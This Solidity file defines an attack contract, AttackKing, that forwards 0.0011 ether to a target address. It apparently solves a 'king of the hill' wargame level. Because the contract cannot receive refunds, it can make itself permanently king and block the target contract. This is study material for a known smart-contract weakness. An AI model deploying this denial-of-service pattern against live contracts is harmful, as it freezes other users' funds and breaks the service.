// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract AttackKing {

    function attackKing(address _to) public payable {
        (bool sent, ) = _to.call{value: 0.0011 ether}("");
        require(sent, "Failed to send Ether");
    }
}
